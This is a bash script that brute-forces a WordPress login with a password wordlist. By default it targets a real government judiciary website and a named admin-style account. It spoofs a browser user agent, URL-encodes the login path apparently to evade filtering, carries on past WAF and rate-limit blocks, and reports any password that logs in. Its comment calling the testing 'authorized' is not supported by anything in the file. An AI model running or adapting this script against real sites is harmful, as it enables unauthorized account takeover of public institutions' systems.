#!/usr/bin/env bash
# Authorized dictionary testing via /wp%2Dlogin.php (cookie-aware curl).
set -euo pipefail

TARGET_URL="${1:-https://sc.judiciary.gov.ph}"
USER="${2:-tyke-test-admin}"
WORDLIST="${3:-$(dirname "$0")/wordlists/roe-dictionary-small.txt}"
DELAY="${4:-6}"
LOGIN="${TARGET_URL%/}/wp%2Dlogin.php"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
CJ="$(mktemp)"

cleanup() { rm -f "$CJ" /tmp/wp_login_body.html; }
trap cleanup EXIT

echo "[*] Target: $TARGET_URL"
echo "[*] User: $USER"
echo "[*] Wordlist: $WORDLIST"
echo "[*] Delay: ${DELAY}s"

found=""
while IFS= read -r pass || [[ -n "$pass" ]]; do
  [[ -z "$pass" || "$pass" =~ ^# ]] && continue

  rm -f "$CJ"
  curl -sS -c "$CJ" -b "$CJ" -A "$UA" "$LOGIN" -o /dev/null
  code=$(curl -sS -c "$CJ" -b "$CJ" -A "$UA" \
    -H "Referer: $LOGIN" \
    -X POST \
    --data-urlencode "log=$USER" \
    --data-urlencode "pwd=$pass" \
    --data-urlencode "wp-submit=Log In" \
    --data-urlencode "testcookie=1" \
    --data-urlencode "redirect_to=${TARGET_URL%/}/wp-admin/" \
    "$LOGIN" -o /tmp/wp_login_body.html -w "%{http_code}")

  if [[ "$code" == "403" ]] || rg -q "could not be satisfied" /tmp/wp_login_body.html 2>/dev/null; then
    echo "  [$code] $pass -> blocked_by_waf_or_rate_limit"
    sleep "$DELAY"
    continue
  fi

  if rg -qi "wordpress_logged_in|wp-admin/profile|dashboard" /tmp/wp_login_body.html; then
    echo "  [$code] $pass -> AUTHENTICATED"
    found="$pass"
    break
  fi

  err=$(rg -o 'id="login_error"[^>]*>.*?</div>' /tmp/wp_login_body.html 2>/dev/null | head -1 | sed 's/<[^>]*>//g' || true)
  if rg -qi "invalid password|incorrect password" /tmp/wp_login_body.html; then
    echo "  [$code] $pass -> valid_user_bad_password"
  elif rg -qi "invalid username|unknown username" /tmp/wp_login_body.html; then
    echo "  [$code] $pass -> invalid_username"
  else
    echo "  [$code] $pass -> ${err:-unknown}"
  fi
  sleep "$DELAY"
done < "$WORDLIST"

if [[ -n "$found" ]]; then
  echo "[+] VALID: $USER / $found"
  exit 0
fi
echo "[-] No valid password in wordlist"
exit 1
